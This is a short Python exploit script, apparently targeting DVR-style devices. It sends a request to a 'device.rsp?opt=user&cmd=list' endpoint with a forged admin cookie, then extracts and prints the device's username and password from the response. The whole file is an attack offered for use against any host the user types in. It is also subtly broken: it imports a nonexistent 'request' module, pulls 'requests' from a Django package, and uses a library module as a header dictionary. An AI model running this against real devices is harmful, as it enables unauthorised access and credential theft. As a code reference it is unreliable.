
import os
from wsgiref import headers

import request
import re
import time

from django.contrib.sites import requests

host = input(f"host ")
port = "85"

forexe = (f"http://{host}:{port}/device.rsp?opt=user&cmd=list")

forchk = (f"http://{host}:{port}/")


def Headers(xCookie):
    headers["Host"] = forchk
    headers["User-Agent"] = "Mozilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Languag"] = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"] = "close"
    headers["Content-Type"] = "text/html"
    headers["Cookie"] = "uid=" + xCookie

    return headers


req = requests.get(forexe, headers=Headers(xCookie="admin"), timeout=10.000).text
user = re.findall(r'"uid":"(.*?)"', req)[0]
pswd = re.findall(r'"pwd":"(.*?)"', req)[0]

time.sleep(2)
print(f"{user}")
print(f"{pswd}")
